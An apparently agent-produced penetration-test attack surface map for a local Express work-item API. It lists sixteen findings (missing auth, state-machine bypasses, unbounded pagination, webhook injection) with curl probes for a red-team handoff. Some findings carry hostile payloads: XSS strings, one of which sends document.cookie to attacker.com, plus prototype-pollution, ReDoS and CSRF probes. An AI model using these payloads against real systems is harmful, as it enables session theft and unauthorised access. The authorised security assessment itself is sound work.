# Attack Surface Map — dev-crew Source App
**Generated:** 2026-04-27  
**Analyst:** pen_tester (static analysis)  
**Handoff to:** red-teamer  
**Target:** http://localhost:3001 (backend), http://localhost:5173 (frontend)  
**Tech stack:** Node.js / Express 4.18, TypeScript, pino/custom logger, prom-client, in-memory store (Map), React/Vite frontend

---

## Scope Summary

All findings are derived from white-box static analysis of:
- `Source/Backend/src/app.ts` — Express app wire-up
- `Source/Backend/src/routes/workItems.ts` — CRUD routes
- `Source/Backend/src/routes/workflow.ts` — state machine action routes
- `Source/Backend/src/routes/intake.ts` — webhook intake
- `Source/Backend/src/routes/dashboard.ts` — dashboard routes
- `Source/Backend/src/store/workItemStore.ts` — in-memory store
- `Source/Backend/src/services/router.ts` — routing/classification service
- `Source/Backend/src/services/assessment.ts` — assessment pod service
- `Source/Backend/src/services/dependency.ts` — dependency graph service
- `Source/Backend/src/middleware/errorHandler.ts` — global error handler
- `Source/Backend/src/utils/id.ts` — ID generation
- `Source/Shared/types/workflow.ts` — shared type contracts

**OWASP focus alignment:** A01 (Broken Access Control), A03 (Injection), A07 (Auth Failures)

---

## CRITICAL FINDINGS

---

### PEN-001: Complete Absence of Authentication — All Endpoints Unauthenticated
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` lines 11-44 (entire middleware chain)
- **Vulnerability Description:** The Express application mounts zero authentication middleware. The middleware chain is: `express.json()` → request logger → routes. There is no JWT verification, no API key check, no session validation, no IP allowlist. Every single endpoint — create, read, update, delete, route, assess, approve, reject, dispatch, dependency management, dashboard, intake webhooks — is accessible to any unauthenticated actor with network access to port 3001.
- **Potential Exploit Path:**
  1. Attacker sends any HTTP request directly to `http://localhost:3001/api/work-items`
  2. No credential is challenged; request proceeds immediately to route handler
  3. Attacker can read all work items, create new ones, manipulate state machine, and access internal dashboard data with zero authentication
- **Red Team Handoff Notes:**
  - Verify with: `curl http://localhost:3001/api/work-items` — expect 200 with data (not 401/403)
  - Verify with: `curl -X POST http://localhost:3001/api/work-items -H 'Content-Type: application/json' -d '{"title":"intruder","description":"unauthorized creation","type":"bug","priority":"low","source":"manual"}'` — expect 201 with created item
  - This affects every endpoint in this map; all findings below assume this unauthenticated context

---

### PEN-002: Unauthenticated Fast-Track Override — Full Assessment Bypass
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` line 57; `Source/Backend/src/services/router.ts` lines 66-88
- **Vulnerability Description:** The `POST /api/work-items/:id/route` endpoint accepts an optional `overrideRoute` field in the request body. If `overrideRoute` is set to `"fast-track"`, the `classifyRoute()` function returns `targetStatus: WorkItemStatus.Approved` immediately, bypassing the entire assessment pod process (four-role review: pod-lead, requirements-reviewer, domain-expert, work-definer). No authentication, authorization role check, or privilege escalation guard exists on this override.

  Router service code (`router.ts` lines 66-76):
  ```typescript
  export function classifyRoute(item: WorkItem, overrideRoute?: WorkItemRoute): RouteResult {
    if (overrideRoute) {
      return {
        route: overrideRoute,
        targetStatus:
          overrideRoute === WorkItemRoute.FastTrack
            ? WorkItemStatus.Approved   // ← instantly approved
            : WorkItemStatus.Proposed,
      };
    }
  ```
- **Potential Exploit Path:**
  1. Attacker creates a work item: `POST /api/work-items` with any title/description/type/priority/source
  2. Item is in `backlog` status
  3. Attacker calls `POST /api/work-items/{id}/route` with body `{"overrideRoute": "fast-track"}`
  4. Item immediately transitions to `approved` status, skipping all assessment pod reviews
  5. Attacker calls `POST /api/work-items/{id}/dispatch` — item is now `in-progress`
  6. Assessment pod never ran; no quality or validity check was performed
- **Red Team Handoff Notes:**
  - Create item, capture `id` from response
  - `curl -X POST http://localhost:3001/api/work-items/{id}/route -H 'Content-Type: application/json' -d '{"overrideRoute":"fast-track"}'`
  - Verify response `status === "approved"` — no assessment records in `assessments` array
  - This directly satisfies pentest objective: "Bypass work item state machine to reach an invalid status"

---

### PEN-003: Unauthenticated Manual Approve Override — Assessment Pod Fully Bypassed
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 93-142
- **Vulnerability Description:** `POST /api/work-items/:id/approve` allows any unauthenticated caller to force an item directly to `approved` status from `proposed`, `reviewing`, or `routing`. Only a valid status transition check (`VALID_STATUS_TRANSITIONS`) is performed — no authentication, no role check. This is a distinct bypass from PEN-002: it works on items that have already entered the assessment flow but not yet been assessed.

  The transition table `VALID_STATUS_TRANSITIONS` allows:
  - `proposed → approved` ✓
  - `reviewing → approved` ✓
  - `routing → approved` ✓

  Any of these can be exploited directly.
- **Potential Exploit Path:**
  1. Route an item to `proposed` status via normal `/route` call
  2. Call `POST /api/work-items/{id}/approve` with body `{"reason": "attacker override"}`
  3. Item transitions to `approved` without any assessment pod review
  4. Dispatch immediately: `POST /api/work-items/{id}/dispatch`
- **Red Team Handoff Notes:**
  - `curl -X POST http://localhost:3001/api/work-items/{id}/approve -H 'Content-Type: application/json' -d '{"reason":"unauthorized approval"}'`
  - Verify `status === "approved"` and `assessments` array is empty
  - Combine with PEN-002 to achieve fast-track dispatch in two steps

---

### PEN-004: Intake Webhooks Have No Authentication — Arbitrary Work Item Injection
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts` lines 11-54
- **Vulnerability Description:** Both intake endpoints (`POST /api/intake/zendesk`, `POST /api/intake/automated`) accept requests from any caller with no authentication. Zendesk webhooks in production should use HMAC-SHA256 signature verification (`X-Zendesk-Webhook-Signature` header) — this is entirely absent. An attacker can impersonate Zendesk and inject arbitrary work items into the system. More critically, these endpoints do NOT validate the `type` and `priority` fields against their respective enums — they pass raw user input directly to the store:

  ```typescript
  type: body.type || WorkItemType.Bug,        // no enum validation
  priority: body.priority || WorkItemPriority.Medium, // no enum validation
  ```

  This allows creation of work items with invalid `type` and `priority` values, corrupting internal state (routing logic, assessment logic, team assignment).
- **Potential Exploit Path:**
  1. `POST /api/intake/zendesk` with `{"title": "injected", "description": "via webhook impersonation", "type": "admin", "priority": "godmode"}`
  2. Item created with invalid enum values: `type = "admin"`, `priority = "godmode"`
  3. Routing service: `isFastTrack` does not match, item goes to full-review path
  4. Assessment pod `assessAsWorkDefiner` switch statement has no default case — falls through silently with incorrect suggestions
  5. Team assignment `assignTeam` would return `TheFixer` (default) since `item.type !== WorkItemType.Feature`
  6. Alternatively: inject thousands of items via `/api/intake/automated` to exhaust memory (DoS)
- **Red Team Handoff Notes:**
  - Inject with invalid enum: `curl -X POST http://localhost:3001/api/intake/zendesk -H 'Content-Type: application/json' -d '{"title":"x","description":"y","type":"INVALID_TYPE","priority":"INVALID_PRIO"}'`
  - Verify the item is created and survives in the store with invalid enum values
  - Probe downstream behavior: call `/route`, `/assess` on the malformed item; observe how routing/assessment handles the invalid type

---

## HIGH FINDINGS

---

### PEN-005: Unbounded Pagination Limit — Full Dataset Enumeration
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 68-74; `Source/Backend/src/routes/dashboard.ts` lines 17-19
- **Vulnerability Description:** The pagination `limit` parameter on `GET /api/work-items` and `GET /api/dashboard/activity` is accepted without any upper-bound validation. The raw value from `req.query.limit` is parsed with `parseInt` and passed directly to the store's `findAll()` and dashboard's `getActivity()`. An attacker can pass `?limit=99999999` to receive all records in a single response, circumventing pagination controls.

  Work items route (`workItems.ts` lines 68-74):
  ```typescript
  const pagination = {
    page: req.query.page ? parseInt(req.query.page as string, 10) : 1,
    limit: req.query.limit ? parseInt(req.query.limit as string, 10) : 20,
    // ← No maximum cap enforced
  };
  ```

  `findAll()` in the store (`workItemStore.ts` line 60) applies: `result.slice(offset, offset + limit)` — with no ceiling on `limit`.
- **Potential Exploit Path:**
  1. `GET /api/work-items?limit=999999&page=1`
  2. Server fetches ALL items from the in-memory Map, serializes entire dataset into a single JSON response
  3. Attacker receives complete data dump including all change histories, dependency graphs, and assessment records
  4. Memory pressure from building a large JSON response could cause application instability
- **Red Team Handoff Notes:**
  - `curl "http://localhost:3001/api/work-items?limit=999999"` — verify `total` field equals `data.length`
  - Create 50+ items first, then verify all are returned in a single request
  - Check dashboard activity: `curl "http://localhost:3001/api/dashboard/activity?limit=999999"`
  - Also test `?limit=0` and `?limit=-1` for edge-case behavior (slice with negative values)
  - This directly satisfies pentest objective: "Enumerate all work items without pagination limit enforcement"

---

### PEN-006: Soft-Deleted Items Permanently Block Dependent Dispatch (Dependency DoS)
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts` lines 64-75; `Source/Backend/src/store/workItemStore.ts` lines 23-27
- **Vulnerability Description:** The `computeHasUnresolvedBlockers()` function treats a soft-deleted blocker as an unresolved blocker, because `findById()` returns `undefined` for soft-deleted items, and the check `if (!blocker || !RESOLVED_STATUSES.includes(blocker.status)) return true` interprets `undefined` as "unresolved".

  ```typescript
  // dependency.ts lines 64-74
  export function computeHasUnresolvedBlockers(itemId: string): boolean {
    const item = store.findById(itemId);
    if (!item) return false;
    for (const link of (item.blockedBy ?? [])) {
      const blocker = store.findById(link.blockerItemId);
      if (!blocker || !RESOLVED_STATUSES.includes(blocker.status)) {
        return true;  // ← soft-deleted blocker = undefined = treated as unresolved
      }
    }
    return false;
  }
  ```

  The dependency link from the blocked item's `blockedBy` array is never cleaned when the blocker is soft-deleted (soft delete only marks the item deleted, it does not update all items that reference it as a blocker). The result: once a soft-deleted item is set as a blocker, the blocked item is permanently unblockable — dispatch is forever denied.
- **Potential Exploit Path:**
  1. Attacker creates Item A (`backlog`)
  2. Attacker creates Item B (`backlog`), routes and approves it
  3. Attacker adds Item A as a blocker for Item B: `POST /api/work-items/{B.id}/dependencies` `{"action":"add","blockerId":"{A.id}"}`
  4. Attacker soft-deletes Item A: `DELETE /api/work-items/{A.id}`
  5. Item B is now permanently blocked — `computeHasUnresolvedBlockers(B.id)` returns `true` because `findById(A.id)` returns `undefined`
  6. All dispatch attempts on Item B fail: `{"error":"Cannot dispatch: work item has unresolved blocking dependencies"}`
  7. Legitimate users cannot un-block B — the blocker doesn't exist in the API (returns 404)
- **Red Team Handoff Notes:**
  - Create two items. Add A as blocker for B. Delete A. Try dispatching B. Verify permanent block.
  - Check if `removeDependency(B.id, A.id)` can recover B (it should still work since it only requires `blockedId` to exist)
  - `curl -X POST http://localhost:3001/api/work-items/{B.id}/dependencies -H 'Content-Type: application/json' -d '{"action":"remove","blockerId":"{A.id}"}'` — test if recovery is possible
  - This partially satisfies pentest objective: "Access or modify a soft-deleted work item via direct ID reference"

---

### PEN-007: No Rate Limiting — Brute Force and DoS Surface
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (no rate-limiting middleware present)
- **Vulnerability Description:** Zero rate-limiting exists anywhere in the middleware chain. Express is running without `express-rate-limit` or any equivalent. Combined with the absence of authentication (PEN-001), this means:
  - Unlimited work item creation (memory exhaustion)
  - Unlimited state transition calls per second (CPU exhaustion)
  - Unlimited dependency graph manipulation
  - No defense against automated enumeration of work item IDs
- **Potential Exploit Path:**
  1. Script: loop `POST /api/work-items` 10,000 times with minimal payload
  2. In-memory `Map` grows unbounded; Node.js process memory exhausts
  3. Service becomes unresponsive, crashing for all legitimate users
- **Red Team Handoff Notes:**
  - Confirm no rate-limit headers in response: `curl -I http://localhost:3001/api/work-items` — verify absence of `X-RateLimit-*` or `Retry-After` headers
  - Measure response time degradation: create 100 items then time successive `GET /api/work-items` calls

---

### PEN-008: Unauthenticated Prometheus Metrics Endpoint — Operational Intelligence Leak
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` line 34
- **Vulnerability Description:** The `/metrics` Prometheus endpoint is exposed without any authentication:
  ```typescript
  app.get('/metrics', async (_req, res) => {
    res.set('Content-Type', registry.contentType);
    res.end(await registry.metrics());
  });
  ```
  This endpoint reveals: total items created (by source and type), total items routed (by route type), total assessment verdicts, total dispatches (by team), dependency operation counts, cycle detection event counts, and all default Node.js process metrics (heap size, CPU time, GC statistics, libuv active handles). An attacker can use this for reconnaissance — understanding the system's activity volume, tech stack internals, and memory consumption.
- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics`
  2. Parse Prometheus text format to extract all counters and node runtime metrics
  3. Use activity cadence to infer business activity, plan exploitation timing
- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/metrics` — verify full Prometheus output with no auth challenge
  - Look for `workflow_items_created_total`, `dispatch_gating_events_total`, Node.js `process_heap_bytes` labels

---

### PEN-009: Invalid Enum Values Accepted via Intake Webhooks — State Corruption
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts` lines 22-24
- **Vulnerability Description:** The main work item creation endpoint (`POST /api/work-items`) validates `type`, `priority`, and `source` against their respective TypeScript enums. The intake webhook endpoints (`/api/intake/zendesk` and `/api/intake/automated`) perform NO such validation — they pass raw `body.type` and `body.priority` directly to `store.createWorkItem()`. An attacker can create work items with arbitrary string values for these fields, bypassing the enum constraints. This creates items in an undefined state that can cause silent failures in the routing, assessment, and dispatch services.

  Downstream effects of invalid `type` (e.g., `"admin"`):
  - `isFastTrack()`: no match → full-review path (silently wrong)
  - `assessAsWorkDefiner()` switch: no matching case, falls through with empty suggestions
  - `assignTeam()`: `item.type !== WorkItemType.Feature` → returns `TheFixer` (silently wrong)
- **Potential Exploit Path:**
  1. `POST /api/intake/zendesk` with `{"title":"x","description":"y longlong","type":"__proto__","priority":"<script>alert(1)</script>"}`
  2. Item stored with `type="__proto__"` and `priority="<script>alert(1)</script>"`
  3. If priority is ever rendered in HTML without escaping → stored XSS vector (see PEN-010)
  4. If objects iterate over items, polluted field names could affect serialization
- **Red Team Handoff Notes:**
  - Inject `type: "INVALID"`, `priority: "INVALID"` and verify 201 response with stored values
  - Then call `/route` and `/assess` on the item; observe inconsistencies in response
  - Attempt `type: "__proto__"` to probe prototype pollution via JSON (mitigated by Express JSON body parser, but worth verifying)

---

## MEDIUM FINDINGS

---

### PEN-010: Stored XSS via Unescaped Text Fields — Frontend Rendering Risk
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 24-56; `Source/Backend/src/routes/intake.ts` (no sanitization); Frontend rendering (React components generally escape by default, but edge cases exist)
- **Vulnerability Description:** The `title` and `description` fields accept arbitrary string content with no server-side HTML sanitization. Both the main creation endpoint and intake webhooks store raw user input verbatim. React's JSX rendering escapes strings by default (preventing XSS in most cases), but any usage of `dangerouslySetInnerHTML` in the frontend, or rendering of field values in non-JSX contexts (e.g., `innerHTML`, `document.write`), would create a stored XSS sink. The change history's `reason` field in `approve` (`workflow.ts` line 115) and `reject` endpoints also stores arbitrary user-supplied strings.

  Additionally, change history entries (`ChangeHistoryEntry.reason`, `.oldValue`, `.newValue`) carry user-controlled strings from the `approve` and `reject` reason fields — these are exposed in `/api/dashboard/activity`.
- **Potential Exploit Path:**
  1. `POST /api/work-items` with `{"title":"<img src=x onerror=alert(document.cookie)>","description":"[long enough]",...}`
  2. Data stored verbatim in the in-memory store
  3. Frontend renders title in work item list page — if any component uses `innerHTML` or `dangerouslySetInnerHTML`, XSS fires
  4. All users viewing the work item list become victims
- **Red Team Handoff Notes:**
  - Create item with: `title: "<script>alert('XSS')</script>"` and `title: "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"`
  - Load the frontend work item list page; observe if payload executes or is escaped
  - Also inject in `reason` field of approve/reject; check `/api/dashboard/activity` response

---

### PEN-011: Unvalidated `page` and `limit` Parameters — Integer Parsing Edge Cases
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 68-74; `Source/Backend/src/routes/dashboard.ts` lines 17-19
- **Vulnerability Description:** The `page` and `limit` query parameters are parsed with `parseInt()` without validation for:
  - Non-numeric strings: `parseInt("abc", 10)` returns `NaN`
  - Negative values: `page=-1`, `limit=-100`
  - Zero: `page=0`, `limit=0`
  - Very large integers that overflow JavaScript's safe integer range
  - Floating point strings: `page=1.5` → `parseInt` returns 1 (safe) but `limit=1.999999e9` could be interesting

  In the store's `findAll()`:
  ```typescript
  const offset = (page - 1) * limit;    // NaN arithmetic if page=NaN
  const data = result.slice(offset, offset + limit);  // slice(NaN) = slice(0)
  ```
  `Array.slice(NaN, NaN + limit)` → `Array.slice(0, NaN)` → returns `[]` (empty array). This may cause silent data suppression without error.

  With `page=0`: `offset = (0-1) * limit = -limit` → `slice(-limit)` returns the LAST `limit` elements. This is an unintended data access pattern.
- **Potential Exploit Path:**
  1. `GET /api/work-items?page=0&limit=20` → returns last 20 items instead of first 20
  2. `GET /api/work-items?limit=NaN` → returns empty data array (silent failure)
  3. `GET /api/work-items?page=-1&limit=10` → `offset = -2 * 10 = -20` → `slice(-20, -10)` → returns items from the middle of the dataset
- **Red Team Handoff Notes:**
  - Test: `curl "http://localhost:3001/api/work-items?page=0&limit=5"` — compare with page=1 response
  - Test: `curl "http://localhost:3001/api/work-items?page=-1&limit=5"` — should not return items from non-standard offset
  - Test: `curl "http://localhost:3001/api/work-items?limit=abc"` — verify error handling vs silent empty response

---

### PEN-012: No CORS Policy — Cross-Origin Requests Unrestricted
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (no `cors` middleware present)
- **Vulnerability Description:** The Express application sets no `Access-Control-Allow-Origin` response headers. Without explicit CORS configuration via the `cors` package, the browser's Same-Origin Policy (SOP) will block cross-origin XMLHttpRequests/fetch calls. However:
  1. **Direct API access** (curl, custom HTTP client, server-side scripts) is completely unrestricted — SOP is a browser-only enforcement
  2. **Simple CORS requests** (form submissions with `application/x-www-form-urlencoded`, some GET requests) are NOT blocked by SOP and could be used for CSRF-style data reads
  3. If CORS headers are later added incorrectly (e.g., `Access-Control-Allow-Origin: *`), the entire API becomes CSRF-eligible since there are no same-site cookies or CSRF tokens

  Note: Given PEN-001 (no auth), CSRF is a secondary concern; but the absence of any CORS policy means the security posture is undefined.
- **Potential Exploit Path:**
  1. Attacker hosts malicious page at `https://evil.com`
  2. Victim's browser loads page; JavaScript attempts `fetch("http://localhost:3001/api/work-items")`
  3. Browser blocks due to SOP (no CORS headers from server) — for browser-based attacks
  4. However, a `<form action="http://localhost:3001/api/work-items" method="POST">` with form-encoded body is NOT blocked by SOP — can trigger state mutations
- **Red Team Handoff Notes:**
  - Verify CORS headers: `curl -H "Origin: http://evil.com" -I http://localhost:3001/api/work-items` — check for absence of `Access-Control-Allow-Origin`
  - Attempt a `<form>` POST submission from a different origin to test CSRF applicability

---

### PEN-013: `GET /api/search` Route Unimplemented — 404 with No Error Handling
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts` (route not registered); `Source/Frontend/src/api/client.ts` line 101-104; `Source/Backend/tests/routes/search.test.ts` (documents the gap)
- **Vulnerability Description:** The frontend API client calls `GET /api/search?q={query}` for the DependencyPicker typeahead. This route is NOT registered in `app.ts` — the test file explicitly notes: *"As of this review cycle the GET /api/search endpoint is NOT wired into Source/Backend/src/app.ts."* Express will respond with a 404 HTML page (default Express 404 handler) which:
  1. Does not match the expected `{ data: WorkItem[] }` response shape — the frontend will throw a JSON parse error
  2. The 404 response reveals Express's default error format (`Cannot GET /api/search`)
  3. Creates a functional gap — the DependencyPicker search is silently broken in the deployed app
  4. Once implemented, the search endpoint introduces a new injection surface: query parameter `q` will search across `title` and `description` fields
- **Potential Exploit Path:**
  1. `GET /api/search?q=` — receives 404 from unregistered route
  2. Future implementation risk: if `q` is not properly sanitized, a regex-based search could be vulnerable to ReDoS (Regular Expression Denial of Service) if user-controlled input is used directly in `RegExp(q)` without escaping
- **Red Team Handoff Notes:**
  - `curl "http://localhost:3001/api/search?q=test"` — verify 404 response and its content-type
  - When/if the route is implemented: probe with ReDoS payloads: `q=a+{20}b` or `q=(a+)+$` against a large dataset
  - Probe with SQL metacharacters: `q='`, `q=";DROP` — though this app uses in-memory store, future DB migrations may be vulnerable

---

### PEN-014: Internal Error Messages Leaked to Clients
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts` lines 59-63, 88-91, 137-141, 203-208, 292-295, 350-352
- **Vulnerability Description:** In all workflow action routes, caught errors are returned verbatim to the HTTP client:
  ```typescript
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Internal server error';
    res.status(500).json({ error: message });  // ← raw service error exposed
  }
  ```
  While the global `errorHandler` middleware correctly returns a generic "Internal server error" message, the per-route catch blocks expose raw service messages. Examples of service error messages that leak internal state:
  - `"Work item ${itemId} not found"` — confirms ID existence/format
  - `"Cannot route work item in status '${item.status}'"` — reveals current state
  - `"Adding this dependency would create a circular dependency chain (cycle detected)"` — reveals graph topology
  - `"Failed to update work item ${itemId}"` — reveals store failure modes
- **Potential Exploit Path:**
  1. Attacker attempts `POST /api/work-items/{uuid}/route` on various UUIDs
  2. Response `{"error":"Work item abc-123 not found"}` vs a 404 with the same message confirms UUID existence
  3. State-probing: attempt transitions from wrong states to enumerate the item's current status via error messages
- **Red Team Handoff Notes:**
  - Submit UUIDs of known vs unknown items; compare error messages to confirm ID oracle
  - Trigger validation errors via wrong-state transitions to enumerate item state without GET permission
  - Compare against the global `errorHandler` response (`{"error":"Internal server error"}`)

---

## LOW FINDINGS

---

### PEN-015: Predictable Sequential Document IDs — Information Disclosure
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/utils/id.ts` lines 4-14
- **Vulnerability Description:** The `docId` is a sequential counter-based identifier (`WI-001`, `WI-002`, etc.) exposed in all API responses. While route parameters use UUIDs (`id`), the `docId` field reveals:
  1. The total number of work items ever created (even soft-deleted ones)
  2. The creation sequence, enabling attackers to understand system activity and correlate events
  3. The counter resets to 0 on server restart, potentially creating duplicate `docId` values across sessions

  The global `docIdCounter` module-level variable is not thread-safe in a multi-instance deployment.
- **Potential Exploit Path:**
  1. Create one item and observe `docId: "WI-042"` — attacker knows 41 items were created before
  2. After server restart, the next item will be `WI-001` again — duplicate docIds possible
  3. Dashboard activity logs reference docIds — leaks historical creation count
- **Red Team Handoff Notes:**
  - Create an item and inspect `docId` to enumerate creation count
  - Restart the server (if possible) and create another item — verify duplicate `docId` generation

---

### PEN-016: No Input Length Validation on Text Fields — Payload Amplification
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts` lines 24-25; `Source/Backend/src/routes/intake.ts` lines 14-15
- **Vulnerability Description:** The `title` and `description` fields have no maximum length validation. While Express's default JSON body parser has a 100KB limit (applied via `express.json()` without a `limit` option set in `app.ts`), this still allows:
  - ~100KB per request allocated in memory
  - Stored in the in-memory Map indefinitely until soft-deleted
  - Multiple requests could occupy significant memory
  - Dashboard `/api/dashboard/activity` serializes change history entries (which include field values) — large values amplify response sizes
- **Potential Exploit Path:**
  1. POST a work item with `description` of 99,999 bytes
  2. Call `/route`, `/assess`, `/approve` — each operation appends change history entries
  3. Each change entry stores `oldValue` and `newValue` — `description` changes duplicate the large payload
  4. Memory grows quadratically with change history depth
- **Red Team Handoff Notes:**
  - Send `description` at Express limit: `"A".repeat(99000)` — verify 201 vs 413 response
  - After creation, update the description multiple times to grow the change history
  - Fetch dashboard activity to measure response size growth

---

## ARCHITECTURAL OBSERVATIONS (Context for Red Team)

### OBS-001: In-Memory Store — No Persistence
The entire data store is `let items: Map<string, WorkItem>`. Server restart = total data loss. The `docIdCounter` also resets. This means:
- No database to attack (no SQLi surface)
- No file system persistence (no path traversal surface)
- All state is volatile — a successful crash (via DoS) resets all work items

### OBS-002: State Machine Is the Primary Business Logic
All security-relevant operations flow through the `VALID_STATUS_TRANSITIONS` map. The state machine transitions are:
```
backlog → routing → proposed → reviewing → approved → in-progress → completed
                             ↘ rejected → backlog
```
The red teamer should attempt to reach `completed` or `in-progress` without traversing legitimate transitions, or to push an item to an impossible state.

### OBS-003: Soft-Delete Visibility Inconsistency
`findById()` returns `undefined` for deleted items, making them invisible via the API. However, the raw Map still contains them with `deleted: true`. The dependency service iterates `item.blocks` which may contain stale references to deleted items. The `onItemResolved` cascade dispatcher (called after reject) also iterates `blocks` and silently skips deleted dependents.

### OBS-004: `RESOLVED_STATUSES` Includes `Rejected`
When an item is rejected, its dependents (items it blocks) are treated as unblocked and may be auto-dispatched (cascade). This is a business logic design where rejection = resolution for dependency purposes. The red teamer should verify whether this creates unintended dispatch chains.

---

## PENTEST OBJECTIVE MAPPING

| Objective | Mapped Finding(s) |
|-----------|------------------|
| "Bypass work item state machine to reach an invalid status" | PEN-002 (fast-track override), PEN-003 (manual approve override) |
| "Access or modify a soft-deleted work item via direct ID reference" | PEN-006 (dependency stale reference to deleted blocker) |
| "Submit a malformed assessment verdict that bypasses routing logic" | PEN-002, PEN-004 (invalid enum injection via intake) |
| "Enumerate all work items without pagination limit enforcement" | PEN-005 (unbounded limit parameter) |

---

## HANDOFF PRIORITY ORDER

For maximum impact, the red teamer should attempt in this order:

1. **PEN-001** — Confirm zero-auth (baseline for all other probes)
2. **PEN-005** — Full data enumeration (no-auth + no-limit = complete data dump)
3. **PEN-002 + PEN-003** — State machine bypass (core business logic breach)
4. **PEN-004** — Webhook injection with invalid enums (data integrity attack)
5. **PEN-006** — Dependency DoS via soft-delete (availability attack)
6. **PEN-008** — Metrics exfiltration (reconnaissance)
7. **PEN-011** — Pagination edge cases (data access via negative page)
